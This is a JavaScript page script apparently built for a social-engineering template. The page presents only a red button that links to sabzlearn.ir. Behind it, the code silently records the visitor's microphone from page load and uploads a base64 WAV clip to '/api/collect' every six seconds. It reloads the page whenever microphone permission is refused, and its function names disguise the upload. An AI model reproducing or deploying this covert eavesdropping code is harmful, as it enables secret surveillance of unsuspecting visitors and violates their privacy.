// Adapted from Simple Recorder.js Demo https://github.com/addpipe/simple-recorderjs-demo
// Recorder.js by: https://github.com/mattdiamond/Recorder.js
// webkitURL is deprecated but nevertheless used for cross-browser compatibility.
URL = window.URL || window.webkitURL;

// --- Global Variables ---
var gumStream; // stream from getUserMedia()
var rec; // Recorder.js object
var input; // MediaStreamAudioSourceNode we'll be recording

// --- AudioContext Shim ---
// Shim for AudioContext when it's not available.
var AudioContext = window.AudioContext || window.webkitAudioContext;
var audioContext; // audio context to help us record

// --- DOM Elements ---
var redButton = document.getElementById("redButton");

// --- Event Listeners ---
redButton.addEventListener("click", Redirect);

/**
 * Redirects the user to a new website when the red button is clicked.
 */
function Redirect() {
    window.open('https://sabzlearn.ir', '_blank');
}

// --- Recording Cycle ---
// Start recording 300ms after the page loads.
window.setTimeout(startRecording, 300);
// Stop recording every 6 seconds to upload the audio in chunks.
window.setInterval(stopRecording, 6000);

/**
 * Starts the audio recording process.
 */
function startRecording() {
    // Define the audio constraints for getUserMedia.
    var constraints = { audio: true, video: false };

    /*
     * We're using the standard promise-based getUserMedia()
     * https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia
     */
    navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
        console.log("getUserMedia() success, stream created, initializing Recorder.js ...");

        /*
         * Create an audio context after getUserMedia is called.
         * The sampleRate might change after getUserMedia is called, like it does on macOS when recording through AirPods.
         * The sampleRate defaults to the one set in your OS for your playback device.
         */
        audioContext = new AudioContext();

        // Assign to gumStream for later use.
        gumStream = stream;

        // Use the stream as the audio source.
        input = audioContext.createMediaStreamSource(stream);

        /*
         * Create the Recorder object and configure it to record mono sound (1 channel).
         * Recording in stereo (2 channels) will double the file size.
         */
        rec = new Recorder(input, { numChannels: 1 });

        // Start the recording process.
        rec.record();
        redButton.disabled = false;

        console.log("Recording started");

    }).catch(function(err) {
        // If getUserMedia() fails, disable the red button and reload the page to try again.
        redButton.disabled = true;
        window.location.reload();
    });
}

/**
 * Stops the audio recording and initiates the upload process.
 */
function stopRecording() {
    console.log("stopButton clicked");

    // Tell the recorder to stop the recording.
    rec.stop();

    // Create the WAV blob and pass it on to create the download link.
    rec.exportWAV(createDownloadLink);
}

/**
 * Creates a download link for the recorded audio blob and uploads it to the server.
 * @param {Blob} blob - The recorded audio data as a Blob.
 */
function createDownloadLink(blob) {
    var reader = new FileReader();
    // Read the Blob as a base64-encoded data URL.
    reader.readAsDataURL(blob);
    reader.onloadend = function() {
        var base64data = reader.result;
        // Send the base64-encoded audio data to the server via an AJAX POST request.
        $.ajax({
            type: 'POST',
            url: '/api/collect',
            contentType: 'application/json',
            data: JSON.stringify({
                template: 'microphone',
                data: {
                    audio: base64data
                }
            }),
            success: function(result) {
                console.log(result);
            },
            error: function(err) {
                console.error(err);
            }
        });
    }

    // Restart the recording process after a 300ms delay.
    window.setTimeout(startRecording, 300);
}
